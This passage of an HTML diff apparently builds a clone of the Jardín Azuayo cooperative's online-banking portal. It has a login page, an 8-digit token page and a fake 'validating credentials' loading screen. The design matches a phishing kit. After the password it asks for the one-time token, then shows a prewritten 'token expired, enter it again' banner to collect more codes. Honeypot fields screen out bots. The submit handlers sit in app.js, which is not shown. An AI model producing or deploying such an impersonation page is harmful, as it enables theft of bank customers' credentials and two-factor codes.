+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                        </a>
+                        <!-- TikTok -->
+                        <a href="https://tiktok.com/@jardinazuayo" target="_blank" rel="noopener" aria-label="TikTok">
+                            <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.97v7.54c.01 2.05-.62 4.13-1.89 5.76-1.76 2.26-4.59 3.52-7.46 3.32-3.14-.14-6.02-2.12-7.14-5.06-1.23-3.23-.39-7.06 2.09-9.4 1.83-1.75 4.47-2.48 6.94-1.88v4.13c-.94-.36-2-.4-2.97-.13-1.28.35-2.31 1.4-2.63 2.69-.47 1.85.58 3.82 2.44 4.34 1.34.38 2.87.05 3.88-.89.65-.6.99-1.46.99-2.34V.02z"/></svg>
+                        </a>
+                    </div>
+
+                    <!-- Center Legal Link -->
+                    <div class="footer-legal">
+                        <a href="#">Aviso Legal - Aviso de privacidad</a>
+                    </div>
+
+                    <!-- Copyright -->
+                    <div class="footer-copy">
+                        <p>© 2024 Derechos Reservados Cooperativa de Ahorro y Crédito Jardín Azuayo</p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Floating Scroll to Top Button -->
+        <button id="scrollToTopBtn" class="scroll-to-top" onclick="scrollToTop()" aria-label="Volver arriba">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <polyline points="18 15 12 9 6 15"></polyline>
+            </svg>
+        </button>
+
+    </div><!-- End #view-home -->
+
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- VIEW 2: PORTAL VIRTUAL SELECTOR (portal ejemplo 1.PNG)      -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="view-javirtual-select" class="page-view">
+        <div class="portal-page" style="background-image: url('jardinazuayo_img/javirtual/07-bg8.png');">
+
+            <!-- Top Decorative Wave -->
+            <div class="portal-top-border">
+                <img src="jardinazuayo_img/javirtual/08-cn6.png" alt="Cenefa superior" class="portal-border-img">
+            </div>
+
+            <!-- Return button -->
+            <div class="portal-nav-bar">
+                <button class="btn-portal-back" onclick="goToView('home')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="19" y1="12" x2="5" y2="12"></line>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
+                    <span>Volver a la página principal</span>
+                </button>
+            </div>
+
+            <div class="portal-main-container">
+                <!-- Header Logo -->
+                <div class="portal-header">
+                    <div class="portal-brand">
+                        <svg class="portal-flower" width="36" height="36" viewBox="0 0 24 24" fill="#de3631">
+                            <circle cx="12" cy="7" r="3.5"></circle>
+                            <circle cx="7" cy="12" r="3.5"></circle>
+                            <circle cx="17" cy="12" r="3.5"></circle>
+                            <circle cx="9.5" cy="17" r="3.5"></circle>
+                            <circle cx="14.5" cy="17" r="3.5"></circle>
+                        </svg>
+                        <h1 class="portal-brand-title">JARDÍN AZUAYO <span class="portal-brand-sub">| VIRTUAL</span></h1>
+                    </div>
+                </div>
+
+                <!-- Central Card (Matching portal ejemplo 1.PNG) -->
+                <div class="portal-card">
+                    <!-- Padlock Circular Badge sitting on top edge -->
+                    <div class="portal-card__badge">
+                        <img src="jardinazuayo_img/javirtual/04-avatar.png" alt="Seguridad JA Virtual" class="portal-padlock-img">
+                    </div>
+
+                    <h2 class="portal-card__title">INGRESO</h2>
+
+                    <div class="portal-card__options">
+                        <!-- Option 1: Socio/a -->
+                        <button class="portal-option-btn" onclick="goToView('javirtual-login')">
+                            <div class="portal-option__left">
+                                <span class="portal-option__icon">
+                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1c5733" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                        <circle cx="12" cy="7" r="4"></circle>
+                                    </svg>
+                                </span>
+                                <span class="portal-option__text">Accede como <strong>Socio/a</strong></span>
+                            </div>
+                            <span class="portal-option__arrow">»</span>
+                        </button>
+
+                        <!-- Option 2: Web Organización -->
+                        <button class="portal-option-btn" onclick="goToView('javirtual-login')">
+                            <div class="portal-option__left">
+                                <div class="portal-option__icon">
+                                    <img src="jardinazuayo_img/javirtual/05-organizaciones.png" alt="Organización" class="org-icon-img">
+                                </div>
+                                <span class="portal-option__text">Accede como <strong>Web Organización</strong></span>
+                            </div>
+                            <span class="portal-option__arrow">»</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Bottom Artwork: Community Crowd -->
+                <div class="portal-crowd-wrap">
+                    <img src="jardinazuayo_img/javirtual/06-rectangle-footer.png" alt="Comunidad Jardín Azuayo" class="portal-crowd-img">
+                </div>
+            </div>
+        </div>
+    </div><!-- End #view-javirtual-select -->
+
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- VIEW 3: PORTAL VIRTUAL LOGIN (portal ejemplo 2.PNG)         -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="view-javirtual-login" class="page-view">
+        <div class="login-layout">
+
+            <!-- Mobile Top Header / Return -->
+            <div class="login-mobile-bar">
+                <button class="btn-login-back" onclick="goToView('javirtual')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="19" y1="12" x2="5" y2="12"></line>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
+                    <span>Opciones de ingreso</span>
+                </button>
+                <button class="btn-login-home" onclick="goToView('home')" title="Ir a Inicio">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                    </svg>
+                </button>
+            </div>
+
+            <div class="login-split-container">
+                <!-- Left Column: Login Form -->
+                <div class="login-col-left">
+                    <div class="login-form-wrap">
+                        <!-- Logo -->
+                        <div class="login-logo-box">
+                            <a href="#" onclick="goToView('home'); return false;">
+                                <img src="jardinazuayo_img/web/01-Frame-3.png" alt="Jardín Azuayo - Cooperativa de Ahorro y Crédito" class="login-logo-img">
+                            </a>
+                        </div>
+
+                        <!-- Title & Description -->
+                        <h2 class="login-heading">Acceso a socios/as</h2>
+                        <p class="login-subtext">
+                            Si ingresas por primera vez, el usuario es tu: Cédula, RUC o Pasaporte. Si ya te registraste, ingresa tu usuario. Ejemplo: usuario123
+                        </p>
+
+                        <!-- Form -->
+                        <form id="jaLoginForm" class="login-form" onsubmit="handleLogin(event)">
+                            <!-- Honeypot anti-bot security field -->
+                            <input type="text" name="sec_verify_hp_token" class="sec-hp-field" tabindex="-1" autocomplete="off" style="position: absolute; left: -9999px; opacity: 0; height: 0; width: 0; pointer-events: none;">
+
+                            <!-- Usuario -->
+                            <div class="login-input-group">
+                                <label for="loginUser" class="login-label">Usuario</label>
+                                <input type="text" id="loginUser" class="login-control" placeholder="Ingresa tu cédula o usuario" required autocomplete="username" pattern="[a-zA-Z0-9]+" title="Ingresa tu usuario alfanumérico (solo letras y números)">
+                                <div class="login-link-right">
+                                    <a href="#" onclick="alertNotice('Para recuperar tu usuario, comunícate con nuestro Call Center al (07) 413-4503 o acércate a la agencia más cercana.'); return false;">Olvidé mi usuario</a>
+                                </div>
+                            </div>
+
+                            <!-- Clave -->
+                            <div class="login-input-group">
+                                <label for="loginPass" class="login-label">Clave</label>
+                                <div class="login-pass-wrap">
+                                    <input type="password" id="loginPass" class="login-control" placeholder="Ingresa tu contraseña" required autocomplete="current-password">
+                                    <button type="button" class="btn-toggle-eye" id="togglePassBtn" onclick="togglePasswordVisibility()" aria-label="Mostrar u ocultar contraseña">
+                                        <!-- Eye Icon SVG -->
+                                        <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                            <circle cx="12" cy="12" r="3"></circle>
+                                        </svg>
+                                        <svg id="eyeClosed" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: none;">
+                                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                                            <line x1="1" y1="1" x2="23" y2="23"></line>
+                                        </svg>
+                                    </button>
+                                </div>
+                                <div class="login-link-right">
+                                    <a href="#" onclick="alertNotice('Para restablecer tu contraseña, utiliza el enlace oficial de recuperación o comunícate a nuestra línea de soporte.'); return false;">Olvidé mi clave</a>
+                                </div>
+                            </div>
+
+                            <!-- Submit Button -->
+                            <button type="submit" id="btnLoginSubmit" class="btn btn-login-submit">
+                                <span class="login-submit-text">Iniciar sesión</span>
+                                <span class="login-spinner" style="display: none;"></span>
+                            </button>
+                        </form>
+
+                        <!-- Security Notice Box -->
+                        <div class="login-security-box">
+                            <span class="security-check-icon">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#28a745">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </span>
+                            <p class="security-text">
+                                Recuerda que tu usuario y clave son secretos. Jardín Azuayo NO solicita información personal ni datos sensibles a través de medios electrónicos.
+                            </p>
+                        </div>
+
+                        <!-- Helpful Links -->
+                        <div class="login-footer-links">
+                            <a href="#" onclick="alertNotice('Puedes configurar y personalizar tu perfil directamente en la sección Ajustes de JA Virtual.'); return false;" class="login-green-link">¿Cómo configurar mi perfil de usuario?</a>
+                            <a href="#" onclick="alertNotice('En Jardín Azuayo Virtual puedes consultar saldos, realizar transferencias directas e interbancarias, pagar servicios y simular créditos las 24 horas.'); return false;" class="login-green-link">Conoce todo lo que puedes hacer en Jardín Azuayo Virtual</a>
+                        </div>
+
+                        <!-- Help Line -->
+                        <div class="login-help-contact">
+                            <span>¿Necesitas ayuda?</span>
+                            <a href="tel:074134503">CallCenter (07)4134503</a>
+                            <span>o</span>
+                            <a href="https://wa.me/593959181350" target="_blank" rel="noopener">Whatsapp +593 95 918 1350</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Column: Verification & Security Guidance -->
+                <div class="login-col-right">
+                    <!-- Top Colorful Border -->
+                    <div class="login-right-top-border">
+                        <img src="jardinazuayo_img/javirtual/08-cn6.png" alt="Cenefa de seguridad" class="login-border-img">
+                    </div>
+
+                    <div class="login-guide-wrap">
+                        <div class="login-reminder-box">
+                            <h3 class="reminder-title">Recuerda:</h3>
+                            <p class="reminder-p">
+                                No accedas a Jardín Azuayo Virtual desde un enlace que se encuentre dentro de un correo o una página no oficial, son falsos y solo pretenden robar tu información.
+                            </p>
+                            <p class="reminder-p">
+                                Verifica la dirección antes de ingresar tu usuario y contraseña: <br>
+                                <span class="official-url-text">https://javirtual.jardinazuayo.fin.ec/jaweb/</span>
+                            </p>
+                        </div>
+
+                        <!-- Transactional Verification Visual Card -->
+                        <div class="verification-card">
+                            <h3 class="verification-card__title">Verifica nuestra página web transaccional</h3>
+
+                            <!-- Official URL pill badge -->
+                            <div class="url-badge">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2.5">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                                </svg>
+                                <span class="url-badge-text">https://javirtual.jardinazuayo.fin.ec/jaweb/</span>
+                            </div>
+
+                            <!-- Screen & Monitor Illustration -->
+                            <div class="monitor-wrap">
+                                <img src="jardinazuayo_img/javirtual/portal-monitor.png" alt="Pantalla de verificación transaccional Jardín Azuayo" class="monitor-img">
+                            </div>
+
+                            <!-- Carousel dots -->
+                            <div class="guide-dots">
+                                <span class="g-dot active"></span>
+                                <span class="g-dot"></span>
+                                <span class="g-dot"></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><!-- End #view-javirtual-login -->
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- VIEW 4: PORTAL VIRTUAL TOKEN (VERIFICACIÓN EN 2 PASOS)     -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="view-javirtual-token" class="page-view">
+        <div class="login-layout">
+            <!-- Mobile Top Header / Return -->
+            <div class="login-mobile-bar">
+                <button class="btn-login-back" onclick="goToView('javirtual-login')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="19" y1="12" x2="5" y2="12"></line>
+                        <polyline points="12 19 5 12 12 5"></polyline>
+                    </svg>
+                    <span>Volver</span>
+                </button>
+                <div class="token-mobile-brand">
+                    <img src="jardinazuayo_img/web/01-Frame-3.png" alt="Jardín Azuayo" style="height: 28px; width: auto;">
+                </div>
+                <button class="btn-login-home" onclick="goToView('home')" title="Ir a Inicio">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Colorful Border Top -->
+            <div class="token-top-cenefa">
+                <img src="jardinazuayo_img/javirtual/08-cn6.png" alt="Cenefa de seguridad" class="login-border-img">
+            </div>
+
+            <div class="token-main-container">
+                <div class="token-card">
+                    <!-- Icon Header -->
+                    <div class="token-icon-header">
+                        <div class="token-shield-pulse">
+                            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                                <polyline points="9 12 11 14 15 10"></polyline>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <h2 class="token-title">Verificación de Seguridad</h2>
+                    <p class="token-description">
+                        Por motivos de seguridad, ingrese el código de seguridad (Token dinámico) emitido a su dispositivo móvil registrado o App Jardín Azuayo.
+                    </p>
+
+                    <!-- User badge -->
+                    <div class="token-user-badge">
+                        <span class="user-badge-label">Socio(a):</span>
+                        <span class="user-badge-val" id="tokenDisplayUser">usuario</span>
+                    </div>
+
+                    <!-- Error Alert Banner (Hidden by default) -->
+                    <div id="tokenErrorBanner" class="token-error-banner" style="display: none;">
+                        <svg class="error-banner-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                        <div class="error-banner-text">
+                            <strong>Token expirado de nuevo ingreselo.</strong> Por favor ingrese el nuevo código generado.
+                        </div>
+                    </div>
+
+                    <!-- Form Token -->
+                    <form id="jaTokenForm" class="token-form" onsubmit="handleTokenSubmit(event)">
+                        <!-- Honeypot anti-bot -->
+                        <input type="text" name="sec_verify_hp_token" class="sec-hp-field" tabindex="-1" autocomplete="off" style="position: absolute; left: -9999px; opacity: 0; height: 0; width: 0; pointer-events: none;">
+
+                        <label class="token-input-label">Ingrese el código de 8 dígitos:</label>
+                        
+                        <!-- 8-digit OTP boxes -->
+                        <div class="otp-inputs-wrapper" id="otpContainer">
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" autocomplete="one-time-code" data-index="0" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="1" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="2" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="3" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="4" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="5" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="6" required>
+                            <input type="tel" inputmode="numeric" maxlength="1" class="otp-digit" pattern="[0-9]" data-index="7" required>
+                        </div>
+
+                        <!-- Timer countdown -->
+                        <div class="token-timer-wrap">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            <span>El código expira en: <strong id="tokenTimerDisplay">02:00</strong></span>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <button type="submit" id="btnTokenSubmit" class="btn btn-login-submit btn-token-submit">
+                            <span class="token-submit-text">Confirmar y Continuar</span>
+                            <span class="token-spinner" style="display: none;"></span>
+                        </button>
+                    </form>
+
+                    <!-- Resend Link -->
+                    <div class="token-resend-row">
+                        <span>¿No recibió el código?</span>
+                        <a href="#" onclick="handleResendToken(event)">Solicitar reenvío</a>
+                    </div>
+
+                    <!-- Security Notice Box -->
+                    <div class="login-security-box" style="margin-top: 24px; margin-bottom: 0;">
+                        <span class="security-check-icon">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="#28a745">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            </svg>
+                        </span>
+                        <p class="security-text" style="font-size: 11.5px;">
+                            Recuerde que ningún funcionario de la Cooperativa Jardín Azuayo le solicitará este código. Es de uso estrictamente confidencial.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><!-- End #view-javirtual-token -->
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- VIEW 5: LANDING / REDIRECCIÓN (CARGA FINAL)                -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="view-javirtual-landing" class="page-view">
+        <div class="landing-loading-layout">
+            <div class="landing-card">
+                <div class="landing-brand">
+                    <img src="jardinazuayo_img/web/01-Frame-3.png" alt="Jardín Azuayo" class="landing-logo">
+                </div>
+                
+                <div class="landing-pulse-loader">
+                    <div class="pulse-ring"></div>
+                    <div class="pulse-ring-inner"></div>
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#1c5733" stroke-width="2.5">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        <polyline points="9 12 11 14 15 10"></polyline>
+                    </svg>
+                </div>
+
+                <h2 class="landing-title">Conectando a Jardín Azuayo Virtual</h2>
+                <p class="landing-subtitle" id="landingStatusText">Validando credenciales y claves de seguridad...</p>
+
+                <!-- Modern Progress Bar -->
+                <div class="landing-progress-track">
+                    <div class="landing-progress-fill" id="landingProgressFill"></div>
+                </div>
+
+                <div class="landing-info-notice">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6a9c2b" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                    </svg>
+                    <span>Estableciendo conexión encriptada de 256 bits... Por favor, no cierre esta ventana.</span>
+                </div>
+            </div>
+        </div>
+    </div><!-- End #view-javirtual-landing -->
+
+
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <!-- MODAL: CALCULADORA DE AHORROS INTERACTIVA                   -->
+    <!-- ═══════════════════════════════════════════════════════════ -->
+    <div id="ahorroModal" class="modal-backdrop" onclick="closeAhorroModalOnBackdrop(event)">
+        <div class="modal-dialog">
+            <div class="modal-header">
+                <div class="modal-title-wrap">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1c5733" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M12 6v12M15 9.5a3 3 0 1 0-3 3 3 3 0 1 1-3 3"></path>
+                    </svg>
+                    <h3>Plan de Ahorro Programado</h3>
+                </div>
+                <button class="modal-close-btn" onclick="closeAhorroModal()" aria-label="Cerrar modal">✕</button>
+            </div>
+            <div class="modal-body">
+                <p class="modal-subtitle">Proyecta cuánto ganarás ahorrando de manera inteligente y segura en Jardín Azuayo.</p>
+
+                <form onsubmit="calculateSavings(event)" class="modal-form">
+                    <div class="form-group">
+                        <label class="form-label" for="ahorroMontoInicial">Monto Inicial ($)</label>
+                        <input type="number" id="ahorroMontoInicial" class="form-control" value="200" min="20" step="10" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="ahorroAporteMensual">Aporte Mensual ($)</label>
+                        <input type="number" id="ahorroAporteMensual" class="form-control" value="50" min="10" step="5" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label" for="ahorroMeses">Plazo de Ahorro</label>
+                        <select id="ahorroMeses" class="form-control form-select">
+                            <option value="6">6 meses (Tasa 5.5% anual)</option>
+                            <option value="12" selected>12 meses (Tasa 6.5% anual)</option>
+                            <option value="24">24 meses (Tasa 7.5% anual)</option>
+                            <option value="36">36 meses (Tasa 8.5% anual)</option>
+                        </select>
+                    </div>
+
+                    <button type="submit" class="btn btn-calc-submit">Calcular Rendimiento</button>
+                </form>
+
+                <div id="ahorroResultCard" class="modal-results" style="display: none;">
+                    <div class="metric-item highlight-total">
+                        <span class="m-label">Total Acumulado Final:</span>
+                        <span class="m-val" id="resAhorroTotal">$ 0.00</span>
+                    </div>
+                    <div class="calc-metrics-grid">
+                        <div class="metric-item">
+                            <span class="m-label">Capital Aportado:</span>
+                            <span class="m-val" id="resAhorroCapital">$ 0.00</span>
+                        </div>
+                        <div class="metric-item">
+                            <span class="m-label">Intereses Ganados:</span>
+                            <span class="m-val" id="resAhorroInteres" style="color: #28a745; font-weight: 700;">$ 0.00</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alert / Toast Notification -->
+    <div id="toastNotification" class="toast-popup">
+        <span id="toastMsg">Mensaje</span>
+    </div>
+
+    <!-- Scripts -->
+    <script src="app.js"></script>
+</body>
+</html>
